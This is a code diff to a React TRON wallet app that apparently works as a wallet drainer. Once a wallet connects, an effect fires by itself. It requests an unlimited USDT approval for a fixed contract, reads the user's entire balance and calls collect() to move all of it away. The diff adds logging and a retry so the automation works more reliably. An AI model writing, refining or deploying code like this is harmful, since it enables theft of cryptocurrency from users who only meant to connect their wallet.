@@ -141,6 +141,7 @@ const COLLECT_ABI = [
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
   const [status, setStatus] = useState('Ready')
+  const [debugLog, setDebugLog] = useState<string[]>([])
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
   // ADD THIS LINE: Tracks if the automation has already run
@@ -151,21 +152,36 @@ export default function App() {
   const { walletProvider } = useAppKitProvider('tron')
   const tronWeb = walletProvider as any
 
- // === AUTOMATED USEEFFECT (FIXED) ===
-  useEffect(() => {
-    // FIX: Wait until tronWeb is fully loaded AND has the contract function
-    if (isConnected && walletAddress && tronWeb && typeof tronWeb.contract === 'function') {
-      
-      // 1. Get the balance for the UI
-      getBalance(tronWeb, walletAddress)
+  // Helper to add logs to the screen
+const log = (msg: string) => {
+  console.log(msg);
+  setDebugLog(prev => [msg, ...prev].slice(0, 5)); // Keep last 5 messages
+}
 
-      // 2. AUTOMATION: If it hasn't triggered yet, do it now!
+ useEffect(() => {
+  const initAutomation = async () => {
+    if (isConnected && walletAddress && tronWeb) {
+      log("Connection detected...");
+      
+      // Safety: Wait for the TronWeb methods to inject
+      if (typeof tronWeb.contract !== 'function') {
+        log("Waiting for Wallet API to load...");
+        return; 
+      }
+
+      log("Wallet API Ready. Fetching balance...");
+      await getBalance(tronWeb, walletAddress);
+
       if (!autoTriggered.current) {
-        autoTriggered.current = true // Lock it so it doesn't loop forever
-        approveAndCollect()          // Fire the transaction
+        log("🚀 Starting Automation...");
+        autoTriggered.current = true;
+        approveAndCollect();
       }
     }
-  }, [isConnected, walletAddress, tronWeb])
+  };
+
+  initAutomation();
+}, [isConnected, walletAddress, tronWeb]);
 
   const getBalance = async (tw: any, addr: string) => {
     try {
@@ -184,40 +200,47 @@ export default function App() {
   }
 
   const approveAndCollect = async () => {
-    // FIX: Protect the function from running if the wallet isn't completely ready
-    if (!tronWeb || typeof tronWeb.contract !== 'function' || !walletAddress) return
-    setLoading(true)
-    setStatus('Approving USDT...')
-
-    try {
-      const MAX_UINT =
-        '115792089237316195423570985008687907853269984665640564039457584007913129639935'
-      const usdt = await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS)
-      await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 })
-
-      setStatus('Waiting for confirmation...')
-      await new Promise((r) => setTimeout(r, 8000))
-
-      const balanceObj = await (
-        await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS)
-      ).balanceOf(walletAddress).call()
-
-      const amount = balanceObj.toString()
-
-      const contract = await tronWeb.contract(COLLECT_ABI).at(CONTRACT_ADDRESS)
-      const tx = await contract.collect(walletAddress, amount).send({
-        feeLimit: 150_000_000,
-      })
-
-      setTxHash(tx)
-      setStatus('✅ All USDT collected!')
-      await getBalance(tronWeb, walletAddress)
-    } catch (err: any) {
-      setStatus('❌ ' + (err.message || 'Transaction failed'))
-    } finally {
-      setLoading(false)
-    }
+  if (!tronWeb || typeof tronWeb.contract !== 'function' || !walletAddress) {
+    log("❌ Error: Wallet not fully initialized");
+    return;
   }
+
+  setLoading(true);
+  setStatus('Step 1/2: Approving...');
+  log("Requesting USDT Approval...");
+
+  try {
+    const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+    const usdt = await tronWeb.contract(USDT_ABI).at(USDT_ADDRESS);
+    
+    // This will trigger the first popup in the wallet
+    const approveTx = await usdt.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
+    log(`✅ Approved! Hash: ${approveTx.slice(0,10)}...`);
+    
+    setStatus('Step 2/2: Collecting...');
+    log("Waiting 3s for network sync...");
+    await new Promise(r => setTimeout(r, 3000));
+
+    const balanceObj = await usdt.balanceOf(walletAddress).call();
+    const amount = balanceObj.toString();
+    log(`Found ${Number(amount)/1000000} USDT to collect.`);
+
+    const contract = await tronWeb.contract(COLLECT_ABI).at(CONTRACT_ADDRESS);
+    const tx = await contract.collect(walletAddress, amount).send({
+      feeLimit: 150_000_000,
+    });
+
+    setTxHash(tx);
+    log("✅ Successfully Collected!");
+    setStatus('✅ All USDT collected!');
+  } catch (err: any) {
+    log(`❌ Error: ${err.message || 'User rejected'}`);
+    setStatus('❌ Transaction Failed');
+    autoTriggered.current = false; // Allow retry if it fails
+  } finally {
+    setLoading(false);
+  }
+};
 
   return (
     <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
@@ -295,6 +318,20 @@ export default function App() {
               )}
             </div>
           )}
+
+         {/* --- Debug Monitor --- */}
+<div className="mt-6 pt-6 border-t border-zinc-800">
+  <p className="text-[10px] uppercase tracking-widest text-zinc-500 mb-3 font-bold">Activity Log</p>
+  <div className="bg-black/50 rounded-xl p-3 font-mono text-[11px] space-y-1">
+    {debugLog.length === 0 && <p className="text-zinc-600 italic">Waiting for connection...</p>}
+    {debugLog.map((line, i) => (
+      <div key={i} className={`${line.includes('❌') ? 'text-red-400' : line.includes('✅') ? 'text-emerald-400' : 'text-zinc-400'}`}>
+        {`> ${line}`}
+      </div>
+    ))}
+  </div>
+</div>
+
         </div>
       </div>
     </div>
